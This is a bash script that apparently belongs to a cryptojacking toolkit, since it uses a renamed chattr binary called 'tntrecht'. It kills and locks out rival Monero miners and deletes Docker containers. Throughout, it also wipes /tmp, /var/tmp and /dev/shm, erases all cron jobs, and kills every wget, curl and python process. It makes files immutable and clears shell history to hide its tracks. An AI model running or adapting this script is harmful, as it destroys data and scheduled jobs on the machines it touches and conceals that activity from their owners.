#!/bin/bash

#   echo ""; echo -e "\e[1;33;41m ### found MINER/APP NAME ### \033[0m"; echo ""

function MainCleanApp(){
CleanTmp
CleanCron

if ! type docker 2>/dev/null 1>/dev/null; then
echo "no docker found!!!"
else
service docker start 2>/dev/null
CleanBadDockers
fi
CleanKinsing
xmrigMiner_Versionen
CleanRootTmpBash
CleanMoneroOcean
CleanOther
}


function CleanTmp(){
echo ""; echo -e "\e[1;33;41m ### cleanup tmp dirs ### \033[0m"; echo ""
chattr -iaR /tmp/  2>/dev/null 1>/dev/null
tntrecht -iaR /tmp/  2>/dev/null 1>/dev/null
rm -fr /tmp/* 2>/dev/null 1>/dev/null
rm -fr /tmp/.* 2>/dev/null 1>/dev/null
pkill -f /tmp/ 2>/dev/null 1>/dev/null
chattr -iaR /var/tmp/  2>/dev/null 1>/dev/null
tntrecht -iaR /var/tmp/  2>/dev/null 1>/dev/null
rm -fr /var/tmp/* 2>/dev/null 1>/dev/null
rm -fr /var/tmp/.* 2>/dev/null 1>/dev/null
pkill -f /var/tmp/ 2>/dev/null 1>/dev/null
chattr -iaR /dev/shm/ 2>/dev/null 1>/dev/null
tntrecht -iaR /dev/shm/ 2>/dev/null 1>/dev/null
rm -fr /dev/shm/* 2>/dev/null 1>/dev/null
rm -fr /dev/shm/.* 2>/dev/null 1>/dev/null
pkill -f /dev/shm/ 2>/dev/null 1>/dev/null
echo ""; echo -e "\e[1;33;41m ### killing procs @ tmp dirs ### \033[0m"; echo ""
pkill -f /tmp/ 2>/dev/null 1>/dev/null
pkill -f wget 2>/dev/null 1>/dev/null
pkill lf curl  2>/dev/null 1>/dev/null
pkill -f python 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/" | awk '{print $1}') 2>/dev/null 1>/dev/null
ps aux | grep -v grep | grep "/tmp/" | awk '{print $2}' | xargs -I % kill -9 %     2>/dev/null
}

function CleanCron(){
echo ""; echo -e "\e[1;33;41m ### cleanup cronjobs ### \033[0m"; echo ""
chattr -iaR /var/spool/cron/ 2>/dev/null 1>/dev/null
tntrecht -iaR /var/spool/cron/ 2>/dev/null 1>/dev/null
rm -fr /var/spool/cron/* 2>/dev/null 1>/dev/null
rm -fr /var/spool/cron/.* 2>/dev/null 1>/dev/null
mkdir /var/spool/cron/crontab -p 2>/dev/null 1>/dev/null
chattr -iaR /etc/cron* 2>/dev/null 1>/dev/null
crontab -r 2>/dev/null 1>/dev/null
rm -fr /etc/cron*/.* 2>/dev/null 1>/dev/null
rm -fr /etc/cron*/* 2>/dev/null 1>/dev/null
}

function CleanKinsing(){
if ! type docker 2>/dev/null 1>/dev/null; then
echo "no docker found!!!"
else
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
fi

KINSING0=$(ps ax | grep -v grep | grep -v find | grep "kinsing")
if [ ! -z "$KINSING0" ];
then
echo ""; echo -e "\e[1;33;41m ### found kinsing ### \033[0m"; echo ""
CleanKinsing
pkill -f kinsing 2>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
echo ""; echo -e "\e[1;33;41m ### found /var/tmp/kinsing ### \033[0m"; echo ""
CleanKinsing
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo $StringToLock > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
echo ""; echo -e "\e[1;33;41m ### found /tmp/kdevtmpfsi ### \033[0m"; echo ""
CleanKinsing
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo $StringToLock > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi
}

function CleanRootTmpBash(){
BASH00=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash")
if [ ! -z "$BASH00" ];
then
echo ""; echo -e "\e[1;33;41m ### found /root/.tmp00/bash ### \033[0m"; echo ""
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash
chattr +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

BASH6400=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash64")
if [ ! -z "$BASH6400" ];
then
echo ""; echo -e "\e[1;33;41m ### found /root/.tmp00/bash64 ### \033[0m"; echo ""
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash64 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash64" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash64) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash64 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash64
chattr +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

}


function CleanMoneroOcean(){
if [ -f /root/moneroocean/xmrig ]; then
echo ""; echo -e "\e[1;33;41m ### found /root/moneroocean/xmrig ### \033[0m"; echo ""
systemctl stop moneroocean_miner.service 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null
chattr -iaR /root/moneroocean/ 2>/dev/null 1>/dev/null
tntrecht -iaR /root/moneroocean/ 2>/dev/null 1>/dev/null
rm -fr /root/moneroocean/ 2>/dev/null 1>/dev/null
kill $(pidof /root/moneroocean/) 2>/dev/null 1>/dev/null
pkill -f xmrig 2>/dev/null 1>/dev/null
fi
}

function CleanOther(){

SYSUPDATA=`ps ax | grep -v grep |  grep "sysupdata"`
if [ ! -z "$SYSUPDATA" ];
then
echo ""; echo -e "\e[1;33;41m ### found sysupdata ### \033[0m"; echo ""
SYSUPDATAxmrig=("/etc/sysupdatas" "/etc/sysupdata" "/etc/networkservics" "/etc/config.json" "/etc/updata.sh" "/tmp/sysupdatas" "/tmp/sysupdata" "/tmp/networkservics" "/tmp/config.json" "/tmp/updata.sh")
for SYSUPDATAfile in ${SYSUPDATAxmrig[@]}; do
tntrecht -ia $SYSUPDATAfile 2>/dev/null 1>/dev/null
chattr -ia $SYSUPDATAfile 2>/dev/null 1>/dev/null
rm -f $SYSUPDATAfile 2>/dev/null 1>/dev/null
kill $(pidof sysupdata) 2>/dev/null 1>/dev/null
pkill -f sysupdata 2>/dev/null 1>/dev/null
done
fi	
	
SVCMINER_ARRAY=("/etc/newsvc.sh" "/tmp/newsvc.sh" "/etc/svcupdate" "/tmp/svcupdate" "/etc/svcguard" "/tmp/svcguard" "/etc/svcupdate" "/tmp/svcupdate" "/etc/svcworkmanager" "/tmp/svcworkmanager")
for SVCMINER in ${SVCMINER_ARRAY[@]}; 
do
if [ -f $SVCMINER ]; then
echo -e "\e[1;33;41m ### found $SVCMINER \033[0m";
chattr -ia $SVCMINER >/dev/null 2>&1;
tntrecht -ia $SVCMINER >/dev/null 2>&1;
chmod 1777 $SVCMINER >/dev/null 2>&1;
rm -f $SVCMINER >/dev/null 2>&1;
kill $(pidof $SVCMINER) >/dev/null 2>&1;
SVCMINER_FILE=${SVCMINER##*/}
kill $(pidof $SVCMINER_FILE) >/dev/null 2>&1;
fi
done;

SYSUPDATE=`ps ax | grep -v grep |  grep "sysupdate"`
if [ ! -z "$SYSUPDATE" ];
then
echo ""; echo -e "\e[1;33;41m ### found sysupdate ### \033[0m"; echo ""
SYSUPDATExmrig=("/etc/sysupdate" "/etc/sysupdates" "/etc/networkservice" "/etc/sysguard" "/etc/config.json" "/etc/update.sh" "/tmp/sysguard" "/tmp/sysupdate" "/tmp/sysupdates" "/tmp/networkservice" "/tmp/config.json" "/tmp/update.sh")
for SYSUPDATEfile in ${SYSUPDATExmrig[@]}; do
tntrecht -ia $SYSUPDATEfile 2>/dev/null 1>/dev/null
chattr -ia $SYSUPDATEfile 2>/dev/null 1>/dev/null
rm -f $SYSUPDATEfile 2>/dev/null 1>/dev/null
kill $(pidof sysupdate) 2>/dev/null 1>/dev/null
pkill -f sysupdate 2>/dev/null 1>/dev/null
done
fi		

LOGROTATE=`ps ax | grep -v grep |  grep "sh ./logrotate"`
if [ ! -z "$LOGROTATE" ];
then
echo ""; echo -e "\e[1;33;41m ### found sh ./logrotate ### \033[0m"; echo ""
chattr -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
tntrecht -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
chmod -x /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
pkill -f logrotate 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "sh ./logrotate" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /usr/sbin/sdvbase) 2>/dev/null 1>/dev/null
echo " " > /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
rm -f /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
chattr -i /opt/threads 2>/dev/null 1>/dev/null
tntrecht -i /opt/threads 2>/dev/null 1>/dev/null
chmod 1777 /opt/threads 2>/dev/null 1>/dev/null
rm -f /opt/threads 2>/dev/null 1>/dev/null
fi


SDVBASE=`ps ax | grep -v grep |  grep "/usr/sbin/sdvbase -c /opt/threads"`
if [ ! -z "$SDVBASE" ];
then
echo ""; echo -e "\e[1;33;41m ### found /usr/sbin/sdvbase -c /opt/threads ### \033[0m"; echo ""
chattr -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
tntrecht -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
chmod -x /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
pkill -f /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/usr/sbin/sdvbase" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /usr/sbin/sdvbase) 2>/dev/null 1>/dev/null
echo " " > /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
rm -f /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
chattr -i /opt/threads 2>/dev/null 1>/dev/null
tntrecht -i /opt/threads 2>/dev/null 1>/dev/null
chmod 1777 /opt/threads 2>/dev/null 1>/dev/null
rm -f /opt/threads 2>/dev/null 1>/dev/null
fi
	
LOGROTARI=`ps ax | grep -v grep |  grep "log_rotari"`
if [ ! -z "$LOGROTARI" ];
then
echo ""; echo -e "\e[1;33;41m ### found log_rotari ### \033[0m"; echo ""
chattr -i /tmp/log_rotari 2>/dev/null 1>/dev/null
tntrecht -i /tmp/log_rotari 2>/dev/null 1>/dev/null
chmod -x /tmp/log_rotari 2>/dev/null 1>/dev/null
pkill -f /tmp/log_rotari 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "log_rotari" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/log_rotari) 2>/dev/null 1>/dev/null
echo " " > /tmp/log_rotari 2>/dev/null 1>/dev/null
rm -f /tmp/log_rotari 2>/dev/null 1>/dev/null
echo $StringToLock > /tmp/log_rotari
chattr +i /tmp/log_rotari 2>/dev/null 1>/dev/null
tntrecht +i /tmp/log_rotari 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

LOGCPUMON=`ps ax | grep -v grep |  grep "/usr/sbin/cpumon"`
if [ ! -z "$LOGCPUMON" ];
then
echo ""; echo -e "\e[1;33;41m ### found /usr/sbin/cpumon ### \033[0m"; echo ""
chattr -i /usr/sbin/cpumon 2>/dev/null 1>/dev/null
tntrecht -i /usr/sbin/cpumon 2>/dev/null 1>/dev/null
chmod -x /usr/sbin/cpumon 2>/dev/null 1>/dev/null
pkill -f /usr/sbin/cpumon 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "cpumon" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /usr/sbin/cpumon) 2>/dev/null 1>/dev/null
echo " " > /usr/sbin/cpumon 2>/dev/null 1>/dev/null
rm -f /usr/sbin/cpumon 2>/dev/null 1>/dev/null
nohup $(while sleep 3; do pkill -f /usr/sbin/cpumon; done) &
fi

OPTSERVER=`ps ax | grep -v grep |  grep "/opt/server"`
if [ ! -z "$OPTSERVER" ];
then
echo ""; echo -e "\e[1;33;41m ### found /opt/server ### \033[0m"; echo ""
chattr -i /opt/server 2>/dev/null 1>/dev/null
tntrecht -i /opt/server 2>/dev/null 1>/dev/null
chmod -x /opt/server 2>/dev/null 1>/dev/null
pkill -f /opt/server 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/opt/server" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /opt/server) 2>/dev/null 1>/dev/null
echo " " > /opt/server 2>/dev/null 1>/dev/null
rm -f /opt/server 2>/dev/null 1>/dev/null
echo $StringToLock > /opt/server
chattr +i /opt/server 2>/dev/null 1>/dev/null
tntrecht +i /opt/server 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi


LOGSDVBASE=`ps ax | grep -v grep |  grep "/usr/sbin/sdvbase"`
if [ ! -z "$LOGSDVBASE" ];
then
echo ""; echo -e "\e[1;33;41m ### found /usr/sbin/sdvbase ### \033[0m"; echo ""
chattr -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
tntrecht -i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
chmod -x /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
pkill -f /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "sdvbase" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /usr/sbin/sdvbase) 2>/dev/null 1>/dev/null
echo " " > /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
rm -f /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
echo $StringToLock > /usr/sbin/sdvbase
chattr +i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
tntrecht +i /usr/sbin/sdvbase 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi


if [ -f /root/.tmp/xmrig ]; then
echo ""; echo -e "\e[1;33;41m ### found /root/.tmp/xmrig ### \033[0m"; echo ""
chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tntrecht -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
for tmpxmrigfile in ${tmpxmrig[@]}; do
rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
killall $tmpxmrigfile 2>/dev/null 1>/dev/null
chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
ps ax| grep xmrig 2>/dev/null 1>/dev/null
done
fi

KSWAPD0=`ps ax | grep -v grep |  grep "./kswapd0"`
if [ ! -z "$KSWAPD0" ];
then
echo ""; echo -e "\e[1;33;41m ### found ./kswapd0 ### \033[0m"; echo ""
chattr -iaR /home/*/.configrc/ 2>/dev/null 1>/dev/null
chattr -iaR /root/.configrc/ 2>/dev/null 1>/dev/null
tntrecht -iaR /home/*/.configrc/ 2>/dev/null 1>/dev/null
tntrecht -iaR /root/.configrc/ 2>/dev/null 1>/dev/null
rm -fr /root/.configrc/ 2>/dev/null 1>/dev/null
find / -name kswapd0 -exec chattr -i {} + -exec tntrecht -i {} + -exec rm -rv {} + -exec pkill -f {} \;   2>/dev/null
ps aux | grep -v grep | grep kswapd0 | awk '{print $2}' | xargs -I % kill -9 %     2>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

BASHGO=`ps ax | grep -v grep |  grep "/bin/bash ./go"`
if [ ! -z "$BASHGO" ];
then
echo ""; echo -e "\e[1;33;41m ### found /bin/bash ./go ### \033[0m"; echo ""
chattr -iaR /home/*/.configrc/ 2>/dev/null 1>/dev/null
chattr -iaR /root/.configrc/ 2>/dev/null 1>/dev/null
tntrecht -iaR /home/*/.configrc/ 2>/dev/null 1>/dev/null
tntrecht -iaR /root/.configrc/ 2>/dev/null 1>/dev/null
rm -fr /root/.configrc/ 2>/dev/null 1>/dev/null
find / -name kswapd0 -exec chattr -i {} + -exec tntrecht -i {} + -exec rm -rv {} + -exec pkill -f {} \;   2>/dev/null
ps aux | grep -v grep | grep "/bin/bash ./go" | awk '{print $2}' | xargs -I % kill -9 %     2>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

DBUSESEX=`ps ax | grep -v grep |  grep "dbused"`
if [ ! -z "$DBUSESEX" ];
then
echo ""; echo -e "\e[1;33;41m ### found dbused ### \033[0m"; echo ""
chattr -iaR /var/tmp/.dbusex/ 2>/dev/null 1>/dev/null
tntrecht -iaR /var/tmp/.dbusex/ 2>/dev/null 1>/dev/null
rm -fr /var/tmp/.dbusex/ 2>/dev/null 1>/dev/null
find / -name dbusex -exec chattr -i {} + -exec tntrecht -i {} + -exec rm -rv {} + -exec pkill -f {} \;   2>/dev/null
find / -name dbused -exec chattr -i {} + -exec tntrecht -i {} + -exec rm -rv {} + -exec pkill -f {} \;   2>/dev/null
rm -fr /tmp/ 2>/dev/null
rm -fr /var/tmp/ 2>/dev/null
ps aux | grep -v grep | grep "dbused" | awk '{print $2}' | xargs -I % kill -9 %     2>/dev/null

history -c 2>/dev/null 1>/dev/null
fi
}

function xmrigMiner_Versionen(){

if [ -f /usr/bin/xmrigMiner ]; then
echo ""; echo -e "\e[1;33;41m ### found /usr/bin/xmrigMiner ### \033[0m"; echo ""
chattr -i /usr/bin/xmrigMiner 2>/dev/null 1>/dev/null
tntrecht -i /usr/bin/xmrigMiner 2>/dev/null 1>/dev/null
rm -f /usr/bin/xmrigMiner 2>/dev/null 1>/dev/null
pkill -f /usr/bin/xmrigMiner 2>/dev/null 1>/dev/null
kill $(pidof /usr/bin/xmrigMiner) 2>/dev/null 1>/dev/null
fi

XMRIG01MINER=`ps ax | grep -v grep |  grep "xmrigMiner"`
if [ ! -z "$XMRIG01MINER" ];
then
echo ""; echo -e "\e[1;33;41m ### found ps ax | grep xmrigMiner ### \033[0m"; echo ""
pkill -f xmrigMiner
kill $(pidof xmrigMiner)
fi


# auditd - /dev/shm/.b
# audi - /.../b2

}




function CleanBadDockers(){
$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "/bin/bash" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "/bin/sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "/usr/bin/supervisor…" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
$(docker rm $(docker ps | grep -v grep | grep "/app/BitLockerServi…" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
#$(docker rm $(docker ps | grep -v grep | grep "chroot /mnt sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null) 2>/dev/null 1>/dev/null
}




MainCleanApp
